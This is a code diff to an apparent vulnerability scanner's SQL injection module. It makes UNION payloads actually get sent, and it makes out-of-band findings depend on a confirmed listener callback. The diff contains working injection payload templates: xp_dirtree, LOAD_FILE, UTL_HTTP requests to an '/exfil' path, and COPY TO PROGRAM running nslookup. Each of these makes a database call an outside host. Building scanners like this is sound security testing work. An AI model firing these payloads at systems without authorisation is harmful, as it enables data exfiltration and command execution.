@@ -236,7 +236,15 @@ class SQLiModule(BaseModule):
 
     def _test_union_based(self, url: str, method: str, param: str, value: str):
         """Test for UNION-based SQLi"""
-        Payloads.SQLI_UNION_BASED
+        # Configured payload library — previously this line was a bare
+        # expression statement (``Payloads.SQLI_UNION_BASED``) so the
+        # payloads were fetched and immediately discarded.  As a
+        # result, the entire UNION technique was effectively dead code:
+        # only the column-count probes below ran, and curated payloads
+        # like ``UNION SELECT @@version,user(),database()`` were never
+        # sent.  Now we test both the curated payloads and the dynamic
+        # column-count probes.
+        configured_payloads = list(Payloads.SQLI_UNION_BASED)
 
         # Get baseline response for comparison
         try:
@@ -246,7 +254,51 @@ class SQLiModule(BaseModule):
         except Exception:
             baseline_text = ""
 
-        # Test with incrementing column count
+        # Phase 1: send the curated UNION payload library.  These often
+        # extract real data (version strings, usernames, table names)
+        # which gives strong, low-noise evidence of injectability.
+        for payload in configured_payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+
+                if not response or response.status_code != 200:
+                    continue
+
+                response_text = response.text
+
+                # Require a meaningful change vs. baseline
+                if abs(len(response_text) - len(baseline_text)) < 20:
+                    continue
+
+                db_patterns = [
+                    r"mysql|postgresql|mssql|oracle|sqlite",
+                    r"ubuntu|debian|centos|redhat",
+                ]
+
+                for pattern in db_patterns:
+                    match = re.search(pattern, response_text, re.IGNORECASE)
+                    if match and match.group(0).lower() not in baseline_text.lower():
+                        from core.engine import Finding
+
+                        finding = Finding(
+                            technique="SQL Injection (UNION-based)",
+                            url=url,
+                            severity="CRITICAL",
+                            confidence=0.85,
+                            param=param,
+                            payload=payload,
+                            evidence=f"UNION query returned new data: {match.group(0)}",
+                        )
+                        self.engine.add_finding(finding)
+                        return
+            except Exception as e:
+                if self.engine.config.get("verbose"):
+                    print(f"{Colors.error(f'UNION SQLi test error: {e}')}")
+
+        # Phase 2: column-count probe with NULL placeholders.  Useful
+        # when the curated payloads' column count doesn't match the
+        # original query.
         for i in range(1, 10):
             try:
                 nulls = ",".join(["NULL"] * i)
@@ -551,60 +603,78 @@ class SQLiModule(BaseModule):
         """Test for out-of-band (OOB) SQL injection.
 
         Sends payloads that attempt to trigger DNS or HTTP requests to an
-        external domain.  OOB findings require external listener verification,
-        so payloads are only sent if a real OOB domain is configured (not the
-        default placeholder).  No finding is produced without listener
-        confirmation.
-        """
-        oob_domain = self.engine.config.get("oob_domain", "oob.example.com")
+        external listener.  An OOB finding can ONLY be confirmed by
+        observing the listener — the response body alone cannot prove
+        execution.
 
-        # Do not report findings with placeholder domain — no way to verify
-        if oob_domain == "oob.example.com":
+        Note on the previous logic (intentionally removed):
+            The earlier implementation reported a finding whenever a
+            SQL error signature appeared in the response.  That logic
+            was inverted: a SQL error means the OOB payload was
+            *rejected* by the database before the egress call could
+            fire, not that it was executed.  A successful OOB payload
+            produces a normal response (no error) and a hit on the
+            external listener — those are the only two states that
+            matter, and neither correlates with "SQL error in body".
+
+        This implementation will only emit a finding when an
+        :class:`core.oob_callback.OOBManager` is wired to the engine
+        AND a callback hit is observed for the unique token embedded
+        in the payload.  In every other case the function is a no-op
+        so that scans cannot produce unverifiable OOB findings.
+        """
+        oob_manager = getattr(self.engine, "oob_manager", None)
+
+        # Without a real listener we cannot verify OOB execution, so
+        # we don't issue payloads at all.  This avoids both noise
+        # against the target and the previous false-positive class.
+        if oob_manager is None or not getattr(oob_manager, "enabled", False):
             return
 
-        # Get baseline for error-signature comparison
-        try:
-            baseline_data = {param: value}
-            baseline_resp = self.requester.request(url, method, data=baseline_data)
-            baseline_text = baseline_resp.text.lower() if baseline_resp else ""
-        except Exception:
-            baseline_text = ""
-
-        payloads = [
-            f"' UNION SELECT LOAD_FILE('\\\\\\\\{oob_domain}\\\\share\\\\file') --",
-            f"'; EXEC master..xp_dirtree '\\\\\\\\{oob_domain}\\\\test' --",
-            f"' UNION SELECT UTL_HTTP.REQUEST('http://{oob_domain}/exfil') FROM dual --",
-            f"'; COPY (SELECT '') TO PROGRAM 'nslookup {oob_domain}' --",
-        ]
-
-        for payload in payloads:
+        for technique_template in (
+            "' UNION SELECT LOAD_FILE('\\\\\\\\{host}\\\\share\\\\file') --",
+            "'; EXEC master..xp_dirtree '\\\\\\\\{host}\\\\test' --",
+            "' UNION SELECT UTL_HTTP.REQUEST('http://{host}/exfil') FROM dual --",
+            "'; COPY (SELECT '') TO PROGRAM 'nslookup {host}' --",
+        ):
             try:
-                data = {param: payload}
-                response = self.requester.request(url, method, data=data)
-
-                if not response:
+                token, callback_url = oob_manager.get_callback_url(
+                    vuln_type="sqli_oob", url=url, param=param,
+                )
+                if not token or not callback_url:
                     continue
 
-                # Only report if the OOB payload triggered a NEW SQL error
-                # (indicates the query was parsed but we can't confirm exfiltration)
-                response_text = response.text.lower()
-                for db_type, signatures in self.error_signatures.items():
-                    for sig in signatures:
-                        sig_lower = sig.lower()
-                        if sig_lower in response_text and sig_lower not in baseline_text:
-                            from core.engine import Finding
+                # Use the unique per-payload host so that a hit can be
+                # correlated back to a specific (url, param, payload).
+                from urllib.parse import urlparse as _urlparse
+                callback_host = _urlparse(callback_url).hostname or token
+                payload = technique_template.format(host=callback_host)
 
-                            finding = Finding(
-                                technique="SQL Injection (OOB Exfiltration)",
-                                url=url,
-                                severity="MEDIUM",
-                                confidence=0.5,
-                                param=param,
-                                payload=payload,
-                                evidence=f"OOB payload triggered {db_type} error; verify on {oob_domain} listener",
-                            )
-                            self.engine.add_finding(finding)
-                            return
+                data = {param: payload}
+                self.requester.request(url, method, data=data)
+
+                # Wait briefly for the listener to receive the egress
+                # request triggered by the database.
+                hits = oob_manager.check(token, timeout=10)
+                if not hits:
+                    continue
+
+                from core.engine import Finding
+
+                finding = Finding(
+                    technique="SQL Injection (OOB Exfiltration)",
+                    url=url,
+                    severity="CRITICAL",
+                    confidence=0.95,
+                    param=param,
+                    payload=payload,
+                    evidence=(
+                        f"OOB callback received on token {token} "
+                        f"({len(hits)} hit(s)) — payload was executed by the database."
+                    ),
+                )
+                self.engine.add_finding(finding)
+                return
 
             except Exception as e:
                 if self.engine.config.get("verbose"):
